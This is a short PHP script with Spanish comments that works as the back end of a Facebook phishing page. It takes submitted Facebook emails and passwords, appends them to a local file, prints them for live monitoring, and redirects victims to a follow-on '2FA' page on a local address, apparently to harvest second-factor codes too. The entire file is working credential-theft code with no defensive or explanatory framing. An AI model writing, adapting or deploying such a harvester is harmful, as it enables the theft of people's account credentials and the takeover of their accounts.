<?php
$file = 'datos-privados.txt';

$email = $_POST['email_facebook'] ?? 'desconocido';
$password = $_POST['password_facebook'] ?? 'desconocida';

$log = "[📩] Correo: $email\n[🔑] Contraseña: $password\n\n";
file_put_contents($file, $log, FILE_APPEND);

// Mostrarlo en consola (si ejecutas desde terminal con tail -f o similar)
echo $log;

// Redirigir a la siguiente fase (2FA o sitio real)
header("Refresh:0; url=http://192.168.1.1/portal_2fa/index.php");
exit();
?>
